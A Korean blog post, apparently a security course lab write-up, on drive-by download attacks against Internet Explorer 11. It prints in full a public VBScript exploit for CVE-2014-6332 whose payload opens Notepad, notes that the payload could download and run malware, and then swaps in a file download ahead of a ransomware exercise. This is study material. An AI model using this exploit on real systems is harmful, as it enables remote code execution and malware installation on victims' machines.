@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="ko">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>(1) 시스템보안🔒 Drive by download :: 드라이브 바이 다운로드 공격 | minj.devlog</title>
+  <meta name="description" content="📃 전체 시나리오 (1) 희생자가 해커의 웹 사이트에 접속하면, &#x27;드라이브 바이 다운로드&#x27; 공격에 의해서 랜썸웨어가 다운 및 실행된다. (2) 랜썸웨어는 희생자의 컴퓨터의 파일들을 암호화하고 암호화할 때 사용한 키를 해커의 웹서버에 전송한다." />
+  <link rel="canonical" href="https://minjipi.github.io/posts/drive-by-download-attack/" />
+  <meta property="og:type" content="article" />
+  <meta property="og:site_name" content="minj.devlog" />
+  <meta property="og:locale" content="ko_KR" />
+  <meta property="og:title" content="(1) 시스템보안🔒 Drive by download :: 드라이브 바이 다운로드 공격" />
+  <meta property="og:description" content="📃 전체 시나리오 (1) 희생자가 해커의 웹 사이트에 접속하면, &#x27;드라이브 바이 다운로드&#x27; 공격에 의해서 랜썸웨어가 다운 및 실행된다. (2) 랜썸웨어는 희생자의 컴퓨터의 파일들을 암호화하고 암호화할 때 사용한 키를 해커의 웹서버에 전송한다." />
+  <meta property="og:url" content="https://minjipi.github.io/posts/drive-by-download-attack/" />
+  <meta property="og:image" content="https://minjipi.github.io/posts/drive-by-download-attack/images/image_1.jpg" />
+  <meta property="article:published_time" content="2021-04-25" />
+  <meta property="article:section" content="Security" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "BlogPosting", "headline": "(1) 시스템보안🔒 Drive by download :: 드라이브 바이 다운로드 공격", "description": "📃 전체 시나리오 (1) 희생자가 해커의 웹 사이트에 접속하면, '드라이브 바이 다운로드' 공격에 의해서 랜썸웨어가 다운 및 실행된다. (2) 랜썸웨어는 희생자의 컴퓨터의 파일들을 암호화하고 암호화할 때 사용한 키를 해커의 웹서버에 전송한다.", "datePublished": "2021-04-25", "dateModified": "2021-04-25", "inLanguage": "ko-KR", "author": {"@type": "Person", "name": "minj", "url": "https://minjipi.github.io/"}, "publisher": {"@type": "Person", "name": "minj", "url": "https://minjipi.github.io/"}, "mainEntityOfPage": "https://minjipi.github.io/posts/drive-by-download-attack/", "image": "https://minjipi.github.io/posts/drive-by-download-attack/images/image_1.jpg", "articleSection": "Security"}</script>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Noto+Serif+KR:wght@400;600;700&family=JetBrains+Mono:wght@400;600&family=Noto+Sans+KR:wght@300;400;500;700&display=swap"
+    rel="stylesheet" />
+  <link rel="stylesheet" href="/style.css" />
+  <style>
+    /* 네이버 '소제목'을 h2 로 바꿨지만 모양은 원래대로 */
+    .naver-post .se-section-sectionTitle h2 { font: inherit; margin: 0; padding: 0; border: 0; color: inherit; }
+  </style>
+</head>
+
+<body>
+  <header class="topbar" style="position:relative;">
+    <a href="/" class="logo">minj<span class="logo-dot">.</span></a>
+    <nav class="topbar-nav">
+      <a href="/posts/" class="topnav-link">posts</a>
+      <a href="/" class="topnav-link">about</a>
+    </nav>
+    <div class="topbar-right">
+      <!-- 검색창은 search-nav.js 가 자동 주입 -->
+    </div>
+  </header>
+
+  <div class="layout">
+    <aside class="sidebar" id="sidebar"></aside>
+
+    <main class="main post-detail-wrap">
+      <article class="post-detail" id="postDetail" data-prerendered="1" data-slug="drive-by-download-attack">
+        <div class="post-detail-header">
+          <div class="post-detail-header-top">
+            <div class="post-detail-meta">
+              <a class="post-cat-badge" href="/posts/?cat=Security">Security</a>
+              <time class="post-date" datetime="2021-04-25">2021.04.25</time>
+            </div>
+            <a id="postSourceBtn" class="post-source-btn" href="https://blog.naver.com/ghdalswl77/222322496066" target="_blank" rel="noopener noreferrer"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>원본 글 보기</a>
+          </div>
+          <h1 class="post-detail-title">(1) 시스템보안🔒 Drive by download :: 드라이브 바이 다운로드 공격</h1>
+        </div>
+        
+        <div class="post-detail-body" id="postBody">
+          <div class="post-body naver-post">
+<!-- source: https://blog.naver.com/ghdalswl77/222322496066 -->
+<div class="se-main-container">
+<div class="se-component se-sectionTitle se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-sectionTitle se-l-default">
+<div class="se-module se-module-text"><h2 class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare se-style-unset"><b>📃 전체 시나리오</b></span></h2></div>
+</div>
+</div>
+</div> <div class="se-component se-text se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-text se-l-default">
+<div class="se-module se-module-text">
+<p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">(1) 희생자가 해커의 웹 사이트에 접속하면, '드라이브 바이 다운로드' 공격에 의해서 랜썸웨어가 다운 및 실행된다.</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">(2) 랜썸웨어는 희생자의 컴퓨터의 파일들을 암호화하고 암호화할 때 사용한 키를 해커의 웹서버에 전송한다.</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">(3) 희생자의 컴퓨터에서 실행된 랜썸웨어가 전송한 키를 해커의 웹서버에서는 파일로 저장한다.</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p>
+</div>
+</div>
+</div>
+</div> <div class="se-component se-sectionTitle se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-sectionTitle se-l-default">
+<div class="se-module se-module-text"><h2 class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare se-style-unset"><b>💣 드라이브 바이 다운로드:</b></span></h2></div>
+</div>
+</div>
+</div> <div class="se-component se-text se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-text se-l-default">
+<div class="se-module se-module-text">
+<p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare se-style-unset"><b>drive by download.</b></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare se-style-unset" style="color:#000000;background-color:#ffffff;"><b>사용자가 특정 웹사이트에 접속하였을 때(이메일 메세지에 포함된 사이트 주소를 클릭하는 경우 포함), 사용자도 모르게, 악성 SW가 사용자의 디바이스(PC나 스마트폰)에 download 되도록 하는 해킹기법을 의미한다. 따라서 사용자는 악성 SW가 자신의 디바이스에 download된 사실을 인지하지 못한다. 이러한 기법은 “</b></span><span class="se-fs- se-ff-nanumsquare se-style-unset" style="color:#000000;background-color:#ffffff;"><u><b>웹브라우저(또는 추가로 설치된 Plugin기능)가 가지고 있는 보안취약점을 활용하는 기법”</b></u></span><span class="se-fs- se-ff-nanumsquare se-style-unset" style="color:#000000;background-color:#ffffff;"><b>이다.</b></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare se-style-unset"></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare se-style-unset"></span></p>
+</div>
+</div>
+</div>
+</div> <div class="se-component se-sectionTitle se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-sectionTitle se-l-default">
+<div class="se-module se-module-text"><h2 class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare se-style-unset"><b>📍 환경 준비</b></span></h2></div>
+</div>
+</div>
+</div> <div class="se-component se-table se-l-default __se-component">
+<div class="se-component-content">
+<div class="se-section se-section-table se-l-default se-section-align-" style="width: 100%;">
+<div class="se-table-container">
+<table class="se-table-content">
+<tbody><tr class="se-tr"><td class="se-cell" colspan="1" rowspan="1" style="width: 50.0%; height: 43.0px;  background-color: #f7f7f7;">
+<div class="se-module se-module-text"><p class="se-text-paragraph se-text-paragraph-align-center"><span class="se-fs- se-ff-nanumsquare"><b>🏴‍☠️ 해커</b></span></p></div>
+</td><td class="se-cell" colspan="1" rowspan="1" style="width: 50.0%; height: 43.0px;  background-color: #fff6f3;">
+<div class="se-module se-module-text"><p class="se-text-paragraph se-text-paragraph-align-center"><span class="se-fs- se-ff-nanumsquare"><b>💻 희생자</b></span></p></div>
+</td></tr><tr class="se-tr"><td class="se-cell" colspan="1" rowspan="1" style="width: 50.0%; height: 43.0px;  background-color: #f7f7f7;">
+<div class="se-module se-module-text"><p class="se-text-paragraph se-text-paragraph-align-center"><span class="se-fs- se-ff-nanumsquare se-style-unset" style="color:#000000;"><b>웹 서버(centos6 php) </b></span><span class="se-fs- se-ff-nanumsquare">웹서버,</span></p></div><div class="se-module se-module-text"><p class="se-text-paragraph se-text-paragraph-align-center"><span class="se-fs- se-ff-nanumsquare"></span></p></div><div class="se-module se-module-text"><p class="se-text-paragraph se-text-paragraph-align-center"><span class="se-fs- se-ff-nanumsquare">웹페이지</span></p></div>
+</td><td class="se-cell" colspan="1" rowspan="1" style="width: 50.0%; height: 43.0px;  background-color: #fff6f3;">
+<div class="se-module se-module-text"><p class="se-text-paragraph se-text-paragraph-align-center"><span class="se-fs- se-ff-nanumsquare">윈도우7,</span></p></div><div class="se-module se-module-text"><p class="se-text-paragraph se-text-paragraph-align-center"><span class="se-fs- se-ff-nanumsquare se-style-unset" style="color:#000000;"></span></p></div><div class="se-module se-module-text"><p class="se-text-paragraph se-text-paragraph-align-center"><span class="se-fs- se-ff-nanumsquare se-style-unset" style="color:#000000;">취약한 인터넷 익스플로러 11로</span></p></div><div class="se-module se-module-text"><p class="se-text-paragraph se-text-paragraph-align-center"><span class="se-fs- se-ff-nanumsquare se-style-unset" style="color:#000000;">해커의 사이트에 방문 </span></p></div>
+</td></tr></tbody>
+</table>
+</div>
+</div>
+</div>
+
+</div> <div class="se-component se-text se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-text se-l-default">
+<div class="se-module se-module-text">
+<p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p>
+</div>
+</div>
+</div>
+</div> <div class="se-component se-sectionTitle se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-sectionTitle se-l-default">
+<div class="se-module se-module-text"><h2 class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare se-style-unset"><b>1. drive by download POC</b></span></h2></div>
+</div>
+</div>
+</div> <div class="se-component se-text se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-text se-l-default">
+<div class="se-module se-module-text">
+<p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare se-style-unset"><b>메모장 실행시키기</b></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare se-style-unset"></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"><b>1) 실습</b></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">/var/www/html 아래에 test.html 파일 생성</span></p>
+</div>
+</div>
+</div>
+</div> <div class="se-component se-code se-l-code_black __se-component">
+<div class="se-component-content">
+<div class="se-section se-section-code se-l-code_black">
+<pre><code>
+
+[root@localhost html]# vi test.html
+
+</code></pre>
+</div>
+</div>
+
+</div> <div class="se-component se-text se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-text se-l-default">
+<div class="se-module se-module-text">
+<p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">여기에 아래 내용 복붙.</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">메모장(노트패드)를 실행하는 코드 입니당</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"><a class="se-link" href="https://www.exploit-db.com/exploits/35229" target="_blank">https://www.exploit-db.com/exploits/35229</a></span></p>
+</div>
+</div>
+</div>
+</div> <div class="se-component se-oglink se-l-image __se-component">
+<div class="se-component-content">
+<div class="se-section se-section-oglink se-l-image se-section-align-">
+<div class="se-module se-module-oglink">
+
+<a class="se-oglink-info" href="https://www.exploit-db.com/exploits/35229" target="_blank">
+<div class="se-oglink-info-container">
+<strong class="se-oglink-title">Microsoft Internet Explorer 11 - OLE Automation Array Remote Code Execution (1)</strong>
+<p class="se-oglink-summary">Microsoft Internet Explorer 11 - OLE Automation Array Remote Code Execution (1) EDB-ID: 35229 CVE: 2014-6332 EDB Verified: Author: yuange Type: remote Exploit:   /   Platform: Windows Date: 2014-11-13 Vulnerable App:</p>
+<p class="se-oglink-url">www.exploit-db.com</p>
+</div>
+</a>
+</div>
+</div>
+</div>
+
+</div> <div class="se-component se-code se-l-code_black __se-component">
+<div class="se-component-content">
+<div class="se-section se-section-code se-l-code_black">
+<pre><code>
+
+//*
+allie(win95+ie3-win10+ie11) dve copy by yuange in 2009.
+   cve-2014-6332 exploit
+   https://twitter.com/yuange75
+   http://hi.baidu.com/yuange1975
+  
+*//
+&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" &gt;
+&lt;head&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;SCRIPT LANGUAGE="VBScript"&gt;
+function runmumaa() 
+On Error Resume Next
+set shell=createobject("Shell.Application")
+shell.ShellExecute "notepad.exe"
+end function
+&lt;/script&gt;
+&lt;SCRIPT LANGUAGE="VBScript"&gt;
+ 
+dim   aa()
+dim   ab()
+dim   a0
+dim   a1
+dim   a2
+dim   a3
+dim   win9x
+dim   intVersion
+dim   rnda
+dim   funclass
+dim   myarray
+
+Begin()
+function Begin()
+  On Error Resume Next
+  info=Navigator.UserAgent
+
+  if(instr(info,"Win64")&gt;0)   then
+     exit   function
+  end if
+if (instr(info,"MSIE")&gt;0)   then 
+             intVersion = CInt(Mid(info, InStr(info, "MSIE") + 5, 2))
+else
+     exit   function  
+             
+  end if
+
+  win9x=0
+BeginInit()
+  If Create()=True Then
+     myarray= chrw(01)&amp;chrw(2176)&amp;chrw(01)&amp;chrw(00)&amp;chrw(00)&amp;chrw(00)&amp;chrw(00)&amp;chrw(00)
+     myarray=myarray&amp;chrw(00)&amp;chrw(32767)&amp;chrw(00)&amp;chrw(0)
+if(intVersion&lt;4) then
+         document.write("&lt;br&gt; IE")
+         document.write(intVersion)
+runshellcode()
+else
+setnotsafemode()
+     end if
+  end if
+end function
+function BeginInit()
+Randomize()
+   redim aa(5)
+   redim ab(5)
+   a0=13+17*rnd(6)
+   a3=7+3*rnd(5)
+end function
+function Create()
+  On Error Resume Next
+  dim i
+  Create=False
+  For i = 0 To 400
+    If Over()=True Then
+    '   document.write(i)     
+       Create=True
+       Exit For
+    End If 
+  Next
+end function
+
+sub testaa()
+end sub
+
+function mydata()
+    On Error Resume Next
+     i=testaa
+     i=null
+     redim  Preserve aa(a2)
+ab(0)=0
+aa(a1)=i
+     ab(0)=6.36598737437801E-314
+aa(a1+2)=myarray
+     ab(2)=1.74088534731324E-310  
+     mydata=aa(a1)
+     redim  Preserve aa(a0)  
+end function
+function setnotsafemode()
+    On Error Resume Next
+    i=mydata()  
+    i=readmemo(i+8)
+    i=readmemo(i+16)
+    j=readmemo(i+&amp;h134)
+for k=0 to &amp;h60 step 4
+        j=readmemo(i+&amp;h120+k)
+if(j=14) then
+              j=0          
+              redim  Preserve aa(a2)
+aa(a1+2)(i+&amp;h11c+k)=ab(4)
+              redim  Preserve aa(a0)  
+
+     j=0 
+              j=readmemo(i+&amp;h120+k)   
+         
+               Exit for
+           end if
+
+    next 
+    ab(2)=1.69759663316747E-313
+runmumaa() 
+end function
+function Over()
+    On Error Resume Next
+    dim type1,type2,type3
+    Over=False
+    a0=a0+a3
+    a1=a0+2
+    a2=a0+&amp;h8000000
+  
+    redim  Preserve aa(a0) 
+    redim   ab(a0)     
+  
+    redim  Preserve aa(a2)
+  
+    type1=1
+ab(0)=1.123456789012345678901234567890
+aa(a0)=10
+If(IsObject(aa(a1-1)) = False) Then
+       if(intVersion&lt;4) then
+           mem=cint(a0+1)*16             
+           j=vartype(aa(a1-1))
+if((j=mem+4) or (j*8=mem+8)) then
+              if(vartype(aa(a1-1))&lt;&gt;0)  Then    
+                 If(IsObject(aa(a1)) = False ) Then             
+                   type1=VarType(aa(a1))
+                 end if               
+              end if
+else
+             redim  Preserve aa(a0)
+             exit  function
+
+           end if
+else
+if(vartype(aa(a1-1))&lt;&gt;0)  Then    
+              If(IsObject(aa(a1)) = False ) Then
+                  type1=VarType(aa(a1))
+              end if               
+            end if
+        end if
+    end if
+If(type1=&amp;h2f66) Then         
+          Over=True      
+    End If  
+    If(type1=&amp;hB9AD) Then
+          Over=True
+          win9x=1
+    End If  
+
+    redim  Preserve aa(a0)          
+        
+end function
+function ReadMemo(add) 
+    On Error Resume Next
+    redim  Preserve aa(a2)
+ab(0)=0
+aa(a1)=add+4
+ab(0)=1.69759663316747E-313       
+    ReadMemo=lenb(aa(a1))
+ab(0)=0    
+ 
+    redim  Preserve aa(a0)
+end function
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre>
+</div>
+</div>
+
+</div> <div class="se-component se-text se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-text se-l-default">
+<div class="se-module se-module-text">
+<p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"># 코드 간단 설명:</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">일단 이 함수가 메모장을 실행시키는 역할을 함.</span></p>
+</div>
+</div>
+</div>
+</div> <div class="se-component se-code se-l-code_stripe __se-component">
+<div class="se-component-content">
+<div class="se-section se-section-code se-l-code_stripe">
+<pre><code>
+
+function runmumaa() 
+On Error Resume Next
+set shell=createobject("Shell.Application")
+shell.ShellExecute "notepad.exe"
+end function
+
+</code></pre>
+</div>
+</div>
+
+</div> <div class="se-component se-text se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-text se-l-default">
+<div class="se-module se-module-text">
+<p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">지금은 Execute "notepad.exe" 이지만,</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">이 함수에서 메모장 실행 뿐 아니라, 악성코드 다운로드나 실행도 할 수 있는 것.</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">저장 후 웹브라우저 껐다가 다시 켜고,</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">인터넷 익스플로러 11에 저 파일의 경로로 접속.</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">2) 실행 결과:</span></p>
+</div>
+</div>
+</div>
+</div> <div class="se-component se-image se-l-default">
+<div class="se-component-content se-component-content-normal">
+<div class="se-section se-section-image se-l-default se-section-align-" style="max-width:500px;">
+<div class="se-module se-module-image">
+<a class="se-module-image-link __se_image_link __se_link" href="#" onclick="return false;">
+<img alt="" class="se-img" decoding="async" src="/posts/drive-by-download-attack/images/nv_0.gif"/>
+</a>
+</div>
+</div>
+</div>
+</div>
+<div class="se-component se-text se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-text se-l-default">
+<div class="se-module se-module-text">
+<p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">접속하면 자동으로 메모장이 실행된다.</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p>
+</div>
+</div>
+</div>
+</div> <div class="se-component se-horizontalLine se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-horizontalLine se-l-default se-section-align-">
+<div class="se-module se-module-horizontalLine">
+<hr class="se-hr"/>
+</div>
+</div>
+</div>
+</div> <div class="se-component se-sectionTitle se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-sectionTitle se-l-default">
+<div class="se-module se-module-text"><h2 class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare se-style-unset"><b>2. 윈도우에서 파일 다운로드 명령어</b></span></h2></div>
+</div>
+</div>
+</div> <div class="se-component se-text se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-text se-l-default">
+<div class="se-module se-module-text">
+<p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">백그라운드 인텔리전트 전송 서비스..</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">윈도우에서 다운로드/업로드 작업을 생성하고 그 프로세스를 모니터링할 수 있는 명령어.</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">리눅스에서의 wget과 비슷함.</span></p>
+</div>
+</div>
+</div>
+</div> <div class="se-component se-image se-l-default">
+<div class="se-component-content se-component-content-normal">
+<div class="se-section se-section-image se-l-default se-section-align-" style="max-width:644px;">
+<div class="se-module se-module-image">
+<a area-hidden="true" class="se-module-image-link __se_image_link __se_link" onclick="return false;">
+<img alt="" class="se-image-resource egjs-visible" decoding="async" loading="lazy" src="/posts/drive-by-download-attack/images/image_1.jpg"/>
+</a>
+</div>
+</div>
+</div>
+</div>
+<div class="se-component se-image se-l-default">
+<div class="se-component-content se-component-content-normal">
+<div class="se-section se-section-image se-l-default se-section-align-" style="max-width:530px;">
+<div class="se-module se-module-image">
+<a area-hidden="true" class="se-module-image-link __se_image_link __se_link" onclick="return false;">
+<img alt="" class="se-image-resource egjs-visible" decoding="async" loading="lazy" src="/posts/drive-by-download-attack/images/image_2.jpg"/>
+</a>
+</div>
+</div>
+</div>
+</div>
+<div class="se-component se-text se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-text se-l-default">
+<div class="se-module se-module-text">
+<p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">이렇게하면 파일이 다운로드 된다.</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p>
+</div>
+</div>
+</div>
+</div> <div class="se-component se-image se-l-default">
+<div class="se-component-content se-component-content-fit">
+<div class="se-section se-section-image se-l-default se-section-align-">
+<div class="se-module se-module-image">
+<a area-hidden="true" class="se-module-image-link __se_image_link __se_link" onclick="return false;">
+<img alt="" class="se-image-resource egjs-visible" decoding="async" loading="lazy" src="/posts/drive-by-download-attack/images/image_3.jpg"/>
+</a>
+</div>
+</div>
+</div>
+</div>
+<div class="se-component se-text se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-text se-l-default">
+<div class="se-module se-module-text">
+<p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">다운로드 한 test.txt파일 확인.</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p>
+</div>
+</div>
+</div>
+</div> <div class="se-component se-sectionTitle se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-sectionTitle se-l-default">
+<div class="se-module se-module-text"><h2 class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare se-style-unset"><b>3. Drive by Download</b></span></h2></div>
+</div>
+</div>
+</div> <div class="se-component se-text se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-text se-l-default">
+<div class="se-module se-module-text">
+<p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">2를 1에 적용해서, 실제 드라이브 바이 다운로드 공격.</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">아까 1의 html 파일 함수에 다음과 같이,</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">파일이 다운로드 되는 코드를 작성한다.</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p>
+</div>
+</div>
+</div>
+</div> <div class="se-component se-image se-l-default">
+<div class="se-component-content se-component-content-extend">
+<div class="se-section se-section-image se-l-default se-section-align-">
+<div class="se-module se-module-image">
+<a area-hidden="true" class="se-module-image-link __se_image_link __se_link" onclick="return false;">
+<img alt="" class="se-image-resource egjs-visible" decoding="async" loading="lazy" src="/posts/drive-by-download-attack/images/image_4.jpg"/>
+</a>
+</div>
+</div>
+</div>
+</div>
+<div class="se-component se-text se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-text se-l-default">
+<div class="se-module se-module-text">
+<p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">test 폴더의 remove.bat을 다운로드.</span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare">실행 결과:</span></p>
+</div>
+</div>
+</div>
+</div> <div class="se-component se-image se-l-default">
+<div class="se-component-content se-component-content-fit">
+<div class="se-section se-section-image se-l-default se-section-align-">
+<div class="se-module se-module-image">
+<a class="se-module-image-link __se_image_link __se_link" href="#" onclick="return false;">
+<img alt="" class="se-img" decoding="async" loading="lazy" src="/posts/drive-by-download-attack/images/nv_1.gif"/>
+</a>
+</div>
+</div>
+</div>
+</div>
+<div class="se-component se-text se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-text se-l-default">
+<div class="se-module se-module-text">
+<p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p><p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p><p class="se-text-paragraph se-text-paragraph-align-center"><span class="se-fs- se-ff-nanumsquare"><a class="se-link" href="https://blog.naver.com/ghdalswl77/222322555605" target="_blank"><i><b>[ 다음 글 ]</b></i></a></span><span class="se-fs- se-ff-nanumsquare"><i> 에서 실습 이어집니다.</i></span></p>
+</div>
+</div>
+</div>
+</div> <div class="se-component se-oglink se-l-large_image __se-component">
+<div class="se-component-content">
+<div class="se-section se-section-oglink se-l-large_image se-section-align-center">
+<div class="se-module se-module-oglink">
+
+<a class="se-oglink-info" href="https://blog.naver.com/ghdalswl77/222322555605" target="_blank">
+<div class="se-oglink-info-container">
+<strong class="se-oglink-title">(2) 시스템보안🔒 랜섬웨어 실습</strong>
+<p class="se-oglink-summary">[ 이전 글 ] 과 이어지는 랜섬웨어 실습 입니다.​📃 전체 시나리오(1) 희생자가 해커의 웹 사이트에 접...</p>
+<p class="se-oglink-url">blog.naver.com</p>
+</div>
+</a>
+</div>
+</div>
+</div>
+
+</div>  <div class="se-component se-text se-l-default">
+<div class="se-component-content">
+<div class="se-section se-section-text se-l-default">
+<div class="se-module se-module-text">
+<p class="se-text-paragraph se-text-paragraph-align-"><span class="se-fs- se-ff-nanumsquare"></span></p>
+</div>
+</div>
+</div>
+</div> </div>
+          </div>
+        </div>
+      </article>
+
+      <nav class="post-nav" id="postNav" aria-label="같은 카테고리 글"></nav>
+    </main>
+  </div>
+
+  <script src="/posts.js"></script>
+  <script src="/path-resolver.js"></script>
+  <script src="/sidebar.js"></script>
+  <script src="/post.js"></script>
+  <script src="/search-nav.js"></script>
+</body>
+
+</html>
